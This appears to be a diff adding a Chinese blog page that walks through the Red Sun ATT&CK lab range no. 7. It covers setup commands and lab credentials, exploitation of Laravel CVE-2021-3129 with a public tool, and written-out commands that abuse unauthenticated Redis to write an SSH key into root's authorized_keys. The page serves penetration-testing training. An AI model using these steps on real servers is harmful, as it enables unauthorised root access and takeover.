@@ -1,0 +1,1437 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="the notes record by hypnotic">
+      
+      
+        <meta name="author" content="hypnotic">
+      
+      
+        <link rel="canonical" href="https://hypnoticp.github.io/CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/index.html">
+      
+      
+      
+      
+      <link rel="icon" href="../../../icons/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.42">
+    
+    
+      
+        <title>红日ATT&CK系列靶场（七） - hypnotic的博客</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.0253249f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:300,300i,400,400i,700,700i%7CUbuntu+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Ubuntu";--md-code-font:"Ubuntu Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="deep" data-md-color-accent="deep">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#attck" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../../index.html" title="hypnotic的博客" class="md-header__button md-logo" aria-label="hypnotic的博客" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            hypnotic的博客
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              红日ATT&amp;CK系列靶场（七）
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="deep" data-md-color-accent="deep"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="deep" data-md-color-accent="deep"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/hypnoticp/hypnoticp.github.io.git" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    hypnoticp.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../index.html" class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Code_audit/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Code_audit
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Vulnerability_analysis/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Vulnerability_analysis
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Tools/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Tools
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../index.html" class="md-tabs__link">
+          
+  
+    
+  
+  CTF
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../SRC/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  SRC
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Security_devices/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Security_devices
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Shell_Scripts/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Shell_Scripts
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../about.html" class="md-tabs__link">
+        
+  
+    
+  
+  About
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../index.html" title="hypnotic的博客" class="md-nav__button md-logo" aria-label="hypnotic的博客" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    hypnotic的博客
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/hypnoticp/hypnoticp.github.io.git" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    hypnoticp.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../index.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Code_audit/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Code_audit
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Vulnerability_analysis/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Vulnerability_analysis
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Tools/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Tools
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    CTF
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../SRC/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    SRC
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Security_devices/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Security_devices
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Shell_Scripts/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Shell_Scripts
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../about.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    About
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+<h1 id="attck">红日ATT&amp;CK系列靶场（七）<a class="headerlink" href="#attck" title="Permanent link">&para;</a></h1>
+<ul>
+<li>网络环境:一共拥有三层网络环境。</li>
+</ul>
+<p><img alt="截图" src="3963e21116f53d7ad09edaffe6b95d01.png" /></p>
+<ul>
+<li>服务配置：</li>
+</ul>
+<p>DMZ区的 Ubuntu 需要启动nginx服务：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>redis-server /etc/redis.conf
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>/usr/sbin/nginx -c /etc/nginx/nginx.conf
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>iptables -F
+</code></pre></div>
+<p>第二层网络的 Ubuntu需要启动docker容器：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sudo service docker start
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>sudo docker start 8e172820ac78
+</code></pre></div>
+<p>第三层网络的 Windows 7 （PC 2）需要启动通达OA：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>C:\MYOA\bin\AutoConfig.exe
+</code></pre></div>
+<ul>
+<li>域用户信息</li>
+</ul>
+<p>域用户账户和密码如下：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>Administrator：Whoami2021
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>whoami：Whoami2021
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>bunny：Bunny2021
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>moretz：Moretz2021
+</code></pre></div>
+<p>Ubuntu 1：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>web：web2021
+</code></pre></div>
+<p>Ubuntu 2：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>ubuntu：ubuntu
+</code></pre></div>
+<p>通达OA账户：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>admin：admin657260
+</code></pre></div>
+<h1 id="_1">外网渗透<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<h2 id="laravel-debug-mode-rcecve-2021-3129">Laravel Debug mode RCE（CVE-2021-3129）<a class="headerlink" href="#laravel-debug-mode-rcecve-2021-3129" title="Permanent link">&para;</a></h2>
+<p>先进行端口扫描</p>
+<p><img alt="截图" src="490e23d74942e9428cff2ed38941707b.png" /></p>
+<p>6379端口也开启了，但是不知道为什么扫不出来。</p>
+<p><img alt="截图" src="e3c1bd5b28a65314b7a79f00bef282e3.png" /></p>
+<p>开放22，80，81，6379端口。</p>
+<p>访问81端口发现是Laravel框架且版本是Laravel v8.29.0 (PHP v7.4.14)</p>
+<p><img alt="截图" src="cf6985b8a9dcf9d0180464e741e0bd61.png" /></p>
+<p>恰好这个框架爆了一个远程代码执行漏洞，我这里直接使用工具进行Getshell</p>
+<blockquote>
+<p>工具链接：https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</p>
+</blockquote>
+<p><img alt="截图" src="c4d6b1bad56043ea439aee9f6c467384.png" /></p>
+<p>简单进行了信息收集</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>hostname
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>cat /etc/hosts
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>cat /proc/1/cgroup
+</code></pre></div>
+<p><img alt="截图" src="2409f35b34b6bd5a047673dd6e42dd48.png" /></p>
+<p>尝试反弹shell到Kali上再进行提权，Kali进行监听，但是最后没有反应。</p>
+<p><img alt="截图" src="4d275b574a3e8a74f632fa1fa463c6e7.png" /></p>
+<p>尝试了MSF的tcp、http均不行，故判断为不出网</p>
+<h2 id="redis">Redis未授权<a class="headerlink" href="#redis" title="Permanent link">&para;</a></h2>
+<p>既然反弹不了shell，只能从其他地方进行入手了，之前进行端口扫描时发现该机器开着6379，<strong>尝试Redis弱口令或未授权访问</strong>，尝试进行连接Redis，连接成功，<strong>存在未授权访问</strong></p>
+<p><img alt="截图" src="93393211eddb8cc53f422d08f2a601bc.png" /></p>
+<p>尝试写入SSH公钥</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>ssh-keygen -t rsa #生成一对RSA SSH密钥，默认存储在/root/.ssh/id_rsa（私钥）和/root/.ssh/id_rsa.pub（公钥）中(默认情况即一直回车)
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt #将两个换行符和公钥内容写入foo.txt，换行符用于分隔。
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>cat foo.txt | redis-cli -h 192.168.111.133 -p 6379 -x set hello #将foo.txt中的内容通过管道传输给Redis命令，设置键hello的值为foo.txt的内容。
+</code></pre></div>
+<p><img alt="截图" src="b9fe34d94f1eeecaf444d7495d9464a1.png" /></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>config set dir /root/.ssh    # 将Redis数据库的持久化目录设置为/root/.ssh，这意味着后续的数据文件会存储在这个目录中
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>config set dbfilename authorized_keys    # 将Redis数据库的持久化文件名设置为authorized_keys。这意味着数据会被保存为/root/.ssh/authorized_keys文件
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>save    # 立即将当前数据库的内容保存到指定的文件（在这个例子中为/root/.ssh/authorized_keys），以便于数据持久化
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>ssh 192.168.111.133 # 连接
+</code></pre></div>
